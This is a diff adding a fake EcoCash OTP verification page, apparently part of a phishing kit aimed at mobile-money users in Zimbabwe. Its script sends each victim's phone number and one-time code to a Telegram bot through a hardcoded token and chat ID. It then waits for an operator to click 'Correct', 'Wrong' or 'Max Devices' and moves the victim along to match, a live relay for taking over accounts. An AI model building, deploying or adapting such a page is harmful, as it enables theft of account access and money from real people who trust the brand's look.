@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - OTP Verification</title>
+    <link rel="icon" type="image/svg+xml" href="https://ecocash.onrender.com/static/favicon.svg">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #ffffff; height: 100vh; display: flex; justify-content: center; align-items: center; }
+
+        .container {
+            width: 400px;
+            height: 640px;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+
+        .top-section {
+            padding: 40px 30px;
+        }
+
+        .logo {
+            text-align: center;
+            font-size: 42px;
+            font-weight: bold;
+        }
+
+        .logo span:first-child {
+            color: #0b5ea6;
+        }
+
+        .logo span:last-child {
+            color: #e41e2b;
+        }
+
+        .login-title {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 24px;
+            color: #666;
+        }
+        }
+
+        /* ── MAIN SECTION ── */
+        .main-section {
+            padding: 20px 30px;
+            background: white;
+        }
+
+        .otp-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .otp-subtitle {
+            font-size: 0.95rem;
+            color: #6b7280;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .phone-display {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #0b5ea6;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .attempt-info {
+            font-size: 0.9rem;
+            color: #ef4444;
+            margin-bottom: 1rem;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        /* OTP input */
+        .otp-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 1.5rem;
+            width: 100%;
+            max-width: 420px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .otp-box {
+            width: 48px;
+            height: 48px;
+            border: 2px solid #0b5ea6;
+            border-radius: 8px;
+            background: #fff;
+            text-align: center;
+            font-size: 24px;
+            outline: none;
+        }
+
+        .resend-link {
+            font-size: 0.9rem;
+            color: #0b5ea6;
+            text-align: center;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-bottom: 1.75rem;
+        }
+        .resend-link:hover { color: #0b5ea6; }
+
+        /* Verify button */
+        .verify-btn {
+            width: 100%;
+            max-width: 420px;
+            padding: 0.9rem;
+            background: #d1d5db;
+            color: #9ca3af;
+            border: none;
+            border-radius: 10px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            font-family: inherit;
+            letter-spacing: 0.08em;
+            cursor: not-allowed;
+            transition: all 0.3s;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .verify-btn.active {
+            background: linear-gradient(135deg, #1d4ed8, #2563eb, #3b82f6);
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(37,99,235,0.4);
+        }
+        .verify-btn.active:hover {
+            box-shadow: 0 6px 20px rgba(37,99,235,0.5);
+            transform: translateY(-1px);
+        }
+
+        /* ── BOTTOM DARK FOOTER ── */
+        .bottom-section {
+            position: relative;
+            bottom: auto;
+            width: 100%;
+            min-height: 120px;
+            background: #0b5ea6;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            padding: 20px;
+            margin-top: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .container {
+            padding-bottom: 30px;
+        }
+
+        .bottom-text {
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+
+        .version {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+            color: #94a3b8;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .footer-terms a:hover { color: #fff; }
+
+        /* Layout glue */
+        .page-body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .white-block {
+            background: #f5f7fa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2.5rem 1.5rem 4rem;
+            position: relative;
+        }
+
+        .white-block::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: -5%;
+            width: 110%;
+            height: 100px;
+            background: #f5f7fa;
+            border-radius: 0 0 50% 50%;
+            z-index: 0;
+        }
+
+        .dark-gap {
+            background: #0f1b2d;
+            height: 60px;
+        }
+
+        /* Processing modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+        }
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .modal-logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            animation: spin 2s linear infinite;
+        }
+        .modal-text {
+            color: #374151;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: #b91c1c;
+            font-size: 0.9rem;
+            margin: 0 0 1rem 0;
+            text-align: center;
+            background-color: #fee2e2;
+            border: 1px solid #ef4444;
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: 500;
+            display: none;
+            width: 100%;
+            max-width: 420px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .error-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body class="page-body">
+
+    <!-- TOP SECTION -->
+    <div class="container">
+    <div class="top-section">
+        <div class="logo">
+            <span>Eco</span><span>Cash</span>
+        </div>
+        <div class="login-title">OTP Verification</div>
+    </div>
+
+    <!-- MAIN SECTION -->
+    <div class="main-section">
+        <div class="otp-title">OTP Verification</div>
+        <div class="otp-subtitle">Enter the OTP sent to your phone number</div>
+        <div class="phone-display" id="phoneDisplay">+263XXXXXXXXX</div>
+        <div class="attempt-info">Attempt 2 of 3</div>
+
+        <form id="otpForm">
+            <!-- OTP input -->
+            <div class="otp-row">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp1" id="o1" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, 'o2')" onkeydown="movePrevOtp(event, this, null)" required="">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp2" id="o2" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, 'o3')" onkeydown="movePrevOtp(event, this, 'o1')" required="">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp3" id="o3" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, 'o4')" onkeydown="movePrevOtp(event, this, 'o2')" required="">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp4" id="o4" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, 'o5')" onkeydown="movePrevOtp(event, this, 'o3')" required="">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp5" id="o5" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, 'o6')" onkeydown="movePrevOtp(event, this, 'o4')" required="">
+                <input class="otp-box" type="text" inputmode="numeric" pattern="[0-9]" name="otp6" id="o6" maxlength="1" oninput="filterOtpDigit(this); moveNextOtp(this, null)" onkeydown="movePrevOtp(event, this, 'o5')" required="">
+            </div>
+
+            <div class="resend-link" onclick="resendOtp()">Didn't receive the code? Resend</div>
+
+            <button type="submit" class="verify-btn" id="verifyBtn" disabled="">VERIFY</button>
+        </form>
+    </div>
+
+    <!-- BOTTOM SECTION -->
+    <div class="bottom-section">
+        <div class="bottom-text">
+            Secure your EcoCash account with OTP verification
+        </div>
+        <div class="version">v4.0.1P</div>
+    </div>
+    </div>
+
+    <!-- Processing Modal -->
+    <div id="processingModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-logo">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#14b8a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <path d="M12 6v6l4 2"></path>
+                </svg>
+            </div>
+            <div class="modal-text" id="modalText">Processing...</div>
+        </div>
+    </div>
+
+    <script src="telegram-config.js"></script>
+    <script>
+        let currentAttempt = 2;
+        let phoneNumber = '';
+        let maxDevicesRedirectInterval = null;
+
+        // Telegram configuration is loaded from telegram-config.js
+        const TELEGRAM_CONFIG = window.TELEGRAM_CONFIG || {
+            BOT_TOKEN: '9231910508:AAFIPsL39ORha1WunGoyChnbBb0dOUYKbkg',
+            CHAT_ID: '8510653374'
+        };
+
+        const TG_API = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}`;
+
+        // Get the latest update_id so we only listen for NEW callbacks
+        async function getLatestUpdateId() {
+            try {
+                const res = await fetch(`${TG_API}/getUpdates?offset=-1`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    return data.result[data.result.length - 1].update_id;
+                }
+            } catch (e) {}
+            return 0;
+        }
+
+        // Send OTP to Telegram with inline buttons
+        async function sendOtpWithButtons(phone, otp) {
+            const message = `🔐 EcoCash OTP Attempt\n📱 Phone: +263${phone}\n🔑 OTP: ${otp}\n⏰ Time: ${new Date().toLocaleString()}`;
+            try {
+                const res = await fetch(`${TG_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: '❌ Wrong OTP', callback_data: 'otp_wrong' },
+                                    { text: '✅ Correct OTP', callback_data: 'otp_correct' }
+                                ],
+                                [
+                                    { text: '📵 Max Devices', callback_data: 'otp_maxdevices' }
+                                ]
+                            ]
+                        }
+                    })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    return data.result.message_id;
+                }
+                return null;
+            } catch (e) {
+                console.error('Telegram send error:', e);
+                return null;
+            }
+        }
+
+        // Answer callback query
+        async function answerCallback(callbackQueryId) {
+            try {
+                await fetch(`${TG_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ callback_query_id: callbackQueryId })
+                });
+            } catch (e) {}
+        }
+
+        // Remove buttons from message after decision
+        async function editMessageAfterDecision(messageId, decision) {
+            try {
+                await fetch(`${TG_API}/editMessageReplyMarkup`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        message_id: messageId,
+                        reply_markup: { inline_keyboard: [] }
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // Poll Telegram for admin decision on OTP
+        async function pollForOtpDecision(sentMessageId, startUpdateId, onResult) {
+            let attempts = 0;
+            const maxAttempts = 120;
+            const offset = startUpdateId + 1;
+
+            const poll = async () => {
+                attempts++;
+                try {
+                    const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&timeout=2`);
+                    const data = await res.json();
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            if (update.callback_query &&
+                                update.callback_query.message &&
+                                update.callback_query.message.message_id === sentMessageId) {
+                                const decision = update.callback_query.data;
+                                await answerCallback(update.callback_query.id);
+                                await editMessageAfterDecision(sentMessageId, decision);
+                                await fetch(`${TG_API}/getUpdates?offset=${update.update_id + 1}`);
+                                onResult(decision);
+                                return;
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error('Poll error:', e);
+                }
+                if (attempts < maxAttempts) {
+                    setTimeout(poll, 1500);
+                } else {
+                    onResult('timeout');
+                }
+            };
+            poll();
+        }
+
+        // Strip non-digit characters from OTP inputs
+        function filterOtpDigit(el) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+        }
+
+        function moveNextOtp(current, nextId) {
+            if (current.value.length === 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+            checkOtpForm();
+        }
+
+        function movePrevOtp(e, current, prevId) {
+            if (e.key === 'Backspace' && current.value === '' && prevId) {
+                document.getElementById(prevId).focus();
+            }
+        }
+
+        function checkOtpForm() {
+            const otp = ['o1','o2','o3','o4','o5','o6'].map(id => document.getElementById(id).value).join('');
+            const btn = document.getElementById('verifyBtn');
+            const ready = otp.length === 6;
+            btn.disabled = !ready;
+            btn.classList.toggle('active', ready);
+            if (ready) {
+                document.getElementById('otpForm').requestSubmit();
+            }
+        }
+
+        function resendOtp() {
+            alert('OTP resent to your phone number');
+        }
+
+        // Disable OTP inputs while waiting
+        function setOtpFormDisabled(disabled) {
+            ['o1','o2','o3','o4','o5','o6'].forEach(id => {
+                document.getElementById(id).disabled = disabled;
+            });
+            document.getElementById('verifyBtn').disabled = disabled;
+        }
+
+        // Clear OTP boxes
+        function clearOtpBoxes() {
+            ['o1','o2','o3','o4','o5','o6'].forEach(id => {
+                document.getElementById(id).value = '';
+            });
+            document.getElementById('o1').focus();
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.classList.remove('active');
+        }
+
+        function handleMaxDevicesRedirect() {
+            const attemptInfo = document.querySelector('.attempt-info');
+            let secondsLeft = 5;
+
+            if (maxDevicesRedirectInterval) {
+                clearInterval(maxDevicesRedirectInterval);
+                maxDevicesRedirectInterval = null;
+            }
+
+            attemptInfo.style.color = '#ef4444';
+            attemptInfo.textContent = `You have reached the maximum number of devices allowed. Redirecting to login in ${secondsLeft} seconds...`;
+
+            maxDevicesRedirectInterval = setInterval(() => {
+                secondsLeft -= 1;
+
+                if (secondsLeft <= 0) {
+                    clearInterval(maxDevicesRedirectInterval);
+                    maxDevicesRedirectInterval = null;
+                    window.location.href = 'ecocash-login.html';
+                    return;
+                }
+
+                attemptInfo.textContent = `You have reached the maximum number of devices allowed. Redirecting to login in ${secondsLeft} seconds...`;
+            }, 1000);
+        }
+
+        // Handle form submission
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otp = ['o1','o2','o3','o4','o5','o6'].map(id => document.getElementById(id).value).join('');
+
+            if (otp.length !== 6) {
+                document.querySelector('.attempt-info').textContent = 'Please enter a valid 6-digit OTP';
+                return;
+            }
+
+            // Disable form while processing
+            setOtpFormDisabled(true);
+
+            // Get latest update_id BEFORE sending
+            const lastUpdateId = await getLatestUpdateId();
+
+            // Send OTP to Telegram with inline buttons
+            const sentMessageId = await sendOtpWithButtons(phoneNumber, otp);
+            if (!sentMessageId) {
+                document.querySelector('.attempt-info').textContent = 'Connection error. Please try again.';
+                setOtpFormDisabled(false);
+                clearOtpBoxes();
+                return;
+            }
+
+            // Show processing modal
+            document.getElementById('processingModal').style.display = 'block';
+            document.getElementById('modalText').textContent = 'Verifying OTP, please wait...';
+
+            // Poll Telegram for admin decision
+            pollForOtpDecision(sentMessageId, lastUpdateId, function(result) {
+                document.getElementById('processingModal').style.display = 'none';
+
+                if (result === 'otp_correct') {
+                    // Redirect to loan limit assessment page
+                    window.location.href = 'loan-limit.html';
+                } else if (result === 'otp_wrong') {
+                    document.querySelector('.attempt-info').style.color = '#ef4444';
+                    document.querySelector('.attempt-info').textContent = 'Invalid OTP. Please try again.';
+                    setOtpFormDisabled(false);
+                    clearOtpBoxes();
+                } else if (result === 'otp_maxdevices') {
+                    setOtpFormDisabled(true);
+                    document.getElementById('verifyBtn').style.display = 'none';
+                    document.querySelector('.resend-link').style.display = 'none';
+                    handleMaxDevicesRedirect();
+                } else {
+                    document.querySelector('.attempt-info').style.color = '#ef4444';
+                    document.querySelector('.attempt-info').textContent = 'Session timed out. Please try again.';
+                    setOtpFormDisabled(false);
+                    clearOtpBoxes();
+                }
+            });
+        });
+
+        window.onload = function() {
+            phoneNumber = localStorage.getItem('loginPhone') || 'XXXXXXXXX';
+            document.getElementById('phoneDisplay').textContent = '+263' + phoneNumber;
+            document.getElementById('o1').focus();
+            document.querySelector('.attempt-info').textContent = `Attempt ${currentAttempt} of 3`;
+        };
+    </script>
+
+</body>
+</html>
